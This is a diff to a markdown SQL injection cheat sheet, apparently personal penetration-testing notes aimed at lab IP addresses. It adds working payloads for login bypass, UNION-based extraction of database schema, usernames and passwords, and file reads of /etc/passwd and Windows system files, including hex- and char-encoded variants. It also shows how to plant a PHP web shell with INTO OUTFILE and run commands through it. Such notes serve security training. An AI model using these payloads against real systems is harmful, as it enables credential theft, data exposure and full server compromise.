@@ -1,7 +1,84 @@
 # SQL Injection
-Here are some quick methods to detect the SQL Injection vulnerability, though the methods are not limited. There are various tricks and tools.
-
 ## Methods To Find Sqli
+## Manual SQLi Enumeration
+```
+Try to Generate Errors:
+- First try ' and "  on an input table
+    - Monitor if there are any errors on the page
+    - If not also check "inspect element" > network tab and see if errors appear, if you see 500 error, SQLi exists
+
+- There maybe some type of sql protection, can you bypass with burpsuite or from the URL?
+    - Example: "http://10.10.125.185:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a"
+    - Example in url encoded: "http://10.10.125.185:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-&password=a"
+
+Login screen:
+- Try a simple SQLi
+    > 'OR 1=1-- -
+    > 'OR true-- -
+- Try URL encoding as well
+    > 'OR%201=1--%20-
+    > 'OR%20true--%20-
+
+ Input box non-string (Integer required):
+    - Example: profileID=10
+    > 1 or 1=1-- -
+    
+Input box string: 
+    - Example: profileID='10'
+    > 1' or '1'='1'-- -
+    
+URL injection (Look at URL for php entry, look for GET statements in BURP)
+    - Example: check URL if there is php to allow injection
+    > 1'+or+'1'$3d'1'--+-+
+    
+POST injection (Look for POST statements in BURP)
+    - Example: look for POST statements in BURP
+    > -1' or 1=1--
+    
+- SQL injection from text boxes
+    - always try passing a single ' or " to the text box first. 
+        - When doing so if you see odd output, check the "Network" view of the inspect element console. 
+            - Look for any errors from the server, select them, and go to "respone" tab
+            - Can run ' Or true -- 
+                - "--" stops the rest of a command from being executed by commenting it out
+
+- Pass a single ' or " into input boxes to check to see if data is passed directly to the database.
+- Test ID paramter with single quote:
+http://192.168.135.10/debug.php?id='
+
+Enumerate numer of columns via order by 
+- Determine how many columns are in a site, increment until it fails.
+http://192.168.135.10/debug.php?id=1 order by 1 
+
+- We can use a Union to extract more information about the data, gives context of the indexes for each column
+http://192.168.135.10/debug.php?id=2 union all select 1,2,3
+
+- Extract data from the database, such as version for MariaDB
+http://192.168.135.10/debug.php?id=2 union all select 1,2,@@version
+
+- Show current DB user
+http://192.168.135.10/debug.php?id=2 union all select 1,2,user()
+
+- Gather all of the schema
+http://192.168.135.10/debug.php?id=2 union all select 1,2,table_name from information_schema.tables
+
+- Extraxt column headers for a table
+http://192.168.135.10/debug.php?id=2 union all select 1,2,column_name from information_schema.columns where table_name=%27users%27    //'users'
+
+- Extraction of usernames and passwords
+http://192.168.135.10/debug.php?id=2%20union%20all%20select%201,%20username,%20password%20from%20users    // 2 union all select 1, username, password from users
+
+- Read files
+http://192.168.135.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
+
+Inject a php backdoor 
+- Create a file and inject code for a backdoor
+http://192.168.135.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php' 
+
+- Access backdoor
+http://192.168.135.10/backdoor.php?cmd=ipconfig
+```
+
 
 ## 1. Using Burpsuite :
 ```
@@ -113,8 +190,10 @@ Even though GROUP BY and ORDER BY have different functionality in SQL, they both
 ' UNION SELECT 1,2,3 -- -	
 ' UNION SELECT 1,@@version,3 -- -
 ' UNION SELECT 1,user(),3 -- -	
-' UNION SELECT 1,load_file('/etc/passwd'),3 -- -	
-' UNION SELECT 1,load_file(0x2f6574632f706173737764),3 -- -	  		 	   // hex encode /etc/passwd
+' UNION SELECT 1,load_file('/etc/passwd'),3 -- -    // Read Files
+- Read files
+http://192.168.135.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
+' UNION SELECT 1,load_file(0x2f6574632f706173737764),3 -- -  // hex encode /etc/passwd
 ' UNION SELECT 1,load_file(char(47,101,116,99,47,112,97,115,115,119,100)),3 -- -  	  // char encode /etc/passwd
 ' UNION SELECT 1,2,3,4,5,group_concat(table_schema) from information_schema.tables -- -  // List databases available
 ' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() -- - // Fetch Table names
